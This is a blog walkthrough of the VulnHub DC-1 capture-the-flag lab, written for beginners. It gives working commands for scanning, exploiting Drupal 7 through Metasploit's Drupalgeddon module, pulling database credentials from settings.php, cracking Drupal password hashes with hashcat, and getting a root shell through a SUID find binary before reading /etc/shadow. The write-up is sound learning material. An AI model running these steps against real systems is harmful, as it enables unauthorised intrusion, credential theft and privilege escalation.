# VulnHub - DC: 1 (In Detail)

_10 min read · February 5, 2026 · by muhdsyahirk_

---

## Entry Log

In this mini-blog, I will show my walkthrough while solving the [**DC: 1**](https://www.vulnhub.com/entry/dc-1,292/) machine from [**VulnHub**](https://www.vulnhub.com/about/). I decided to write this because many existing write-ups skip important steps, especially for beginners who want to understand the full process. This walkthrough focuses not only on the commands used, but also the reasoning behind each step. The machine covers CMS exploitation, password cracking, and Linux privilege escalation. I will explain everything based on my actual learning experience while solving the lab.

- Difficulty: Easy
- Machine Author: DCAU7

---

## Getting the Machine IP Address

First, I use [**Netdiscover**](https://www.kali.org/tools/netdiscover/) to identify the IP address of DC-1 machine on the local network.

```bash
sudo netdiscover -i eth0 -r 192.168.11.0/24
```

![Netdiscover Output](./img/vulnhub-dc1/Netdiscover-output.png)

In my case, DC-1 IP address is **192.168.11.140**.

---

## Scanning for Open Ports

Next I scanned the machine using [**Nmap**](https://www.kali.org/tools/nmap/).

```bash
sudo nmap -sCV 192.168.11.140
```

- -sC → Run default scripts.
- -sV → Service version detection.

![Nmap Output](./img/vulnhub-dc1/Nmap-output.png)

From this results, I noticed that HTTP server is running. So i opened the IP address in the browser.

![DC: 1 Website](./img/vulnhub-dc1/DC1-site.png)

After accessing the site, I tried brute forcing login credentials using common usernames and passwords, but nothing worked.

From the scan results, I also saw ‘http-generator: Drupal 7’. This is important because it tells us the **Content Management System (CMS)** used by the website.

---

## Identifying the Vulnerability

Since the website is running [**Drupal 7**](https://www.drupal.org/about/drupal-7), I searched for known exploits.

![Drupal 7 Exploit](./img/vulnhub-dc1/Drupal7-exploit.png)

I found a well-known vulnerability called [**Drupalgeddon**](https://www.drupal.org/project/drupalgeddon). This exploit allows Remote Code Execution (RCE) on vulnerable Drupal versions.

---

## Gaining Access to DC-1 Machine

I then start msfconsole and search for Drupalgeddon modules:

```bash
msfconsole
search Drupalgeddon
```

![Drupalgeddon](./img/vulnhub-dc1/Drupalgeddon.png)

As shown here, this module works for Drupal version 7.x until 8.x.

Use the exploit:

```bash
use 0
set RHOST 192.168.11.140
exploit
```

I verify the access:

```bash
sysinfo
```

Then I spawn a shell and make it interactive terminal:

```bash
shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

This makes the shell more stable and usable.

---

## Flag 1

![List Result](./img/vulnhub-dc1/ls-f1.png)

After listing the files, I found the **first flag**:

![Flag 1](./img/vulnhub-dc1/flag1.png)

CMS is basically a web application that allows people to manage website content without building everything from scratch.

CMS platforms usually store:

- database credentials
- secret keys
- configuration settings

They are usually stored inside configuration files.

So the next logical step is to locate Drupal config files.

---

## Flag 2

After doing some [google search](https://www.drupal.org/forum/general/general-discussion/2008-06-19/drupal-configuration-file), I found out that it’s located at sites/default/settings.php.

Navigate there:

```bash
cd sites/default
cat settings.php
```

I found the **second flag**:

![Flag 2](./img/vulnhub-dc1/flag2.png)

Under the flag, I saw:

- database username
- database password
- database name

This flag tells us to access the database.

---

## Flag 3

Login to MySQL:

```bash
mysql -u dbuser -p
R0ck3t
```

List databases:

```bash
show databases;
```

![Database List](./img/vulnhub-dc1/database-list.png)

Select Drupal database and list the tables:

```bash
use drupaldb;
show tables;
```

![Table List](./img/vulnhub-dc1/table-list.png)

I noticed a table named ‘users’. It usually stores login credentials.

Retrieve user data:

```bash
select * from users;
```

![User Data](./img/vulnhub-dc1/user-data.png)

The password starts with ‘$S$’. This indicates a Drupal 7 hash.

I saved the hash in .txt file and used [**Hashcat**](https://www.kali.org/tools/hashcat/) to crack it:

```bash
hashcat -m 7900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

- -m 7900 → Hash type (7900 is Drupal 7).
- -a 0 → Attack mode (0 is dictionary attack).

After some time…

```bash
hashcat --show -m 7900 hash.txt
```

I got ‘53cr3t’ as the password. I then logged into the site using admin account.

Inside it, I found the **third flag**:

![Admin Dashboard](./img/vulnhub-dc1/admin-dashb.png)

The content:

![Flag 3](./img/vulnhub-dc1/flag3.png)

Hints:

- Special permissions → Set User ID (SUID - 4 | u+s).
- ‘find’ command.
- Accessing ‘shadow’ file → /etc/shadow.

This flag tells us that we can become root by abusing a SUID binary. When a file has the SUID bit set, it runs with the privileges of its owner (in this case, root). Since the find binary allows command execution using the -exec parameter, we can execute a shell that runs with root privileges. After gaining root access, we can then read restricted files such as /etc/shadow.

---

## Flag 4 and Final Flag

Find SUID files:

```bash
find / -perm -4000 2>/dev/null
```

- find → Program used to search files.
- / → Search starting from root directory (search the whole system).
- -perm -4000 → Find files with permission 4000 (SUID).
- 2>/dev/null → Dump errors in BLACK HOLE (hide permission errors).

![SUID Files](./img/vulnhub-dc1/SUID-files.png)

As shown here, /usr/bin/find has the SUID bit set, which allows it to run with root privileges.

To do privilege escalation using SUID find:

```bash
find . -exec /bin/sh \; -quit
```

- find . → Run find in current directory.
- -exec → Execute command.
- /bin/sh → Launch shell. Since find is SUID root, this shell will runs as root.
- ; → Marks end of the exec command (\ is for escaping ;).
- -quit → Stops after first execution.

![Privilege Escalated](./img/vulnhub-dc1/Priv-Esc.png)

Accessing the ‘shadow’ file:

```bash
cat /etc/shadow
```

![Shadow File](./img/vulnhub-dc1/shadow-file.png)

This file contains password hashes.

I also checked /etc/passwd:

![Passwd File](./img/vulnhub-dc1/passwd-file.png)

I saw that flag4 is stored in /home

Then I found the **fourth flag**:

![Flag 4](./img/vulnhub-dc1/flag4.png)

This flag hints that the **final flag** is stored in root directory.

![Final Flag](./img/vulnhub-dc1/finalflag.png)

Bomba! Settleee.

---

## Session Terminated

DC-1 machine was a good beginner-level lab that demonstrates a realistic penetration testing workflow from start to finish. I learned how to:

- perform enumeration using Nmap
- identify CMS platforms and search for known exploits
- exploit Drupal using Drupalgeddon
- extract credentials from configuration files
- access databases and analyse tables
- crack password hashes using Hashcat
- understand Linux SUID permissions
- perform privilege escalation using misconfigured binaries

Overall, this was a very educational lab that helped strengthen my fundamentals in web exploitation and Linux privilege escalation. Thank you for reading and see you next time!
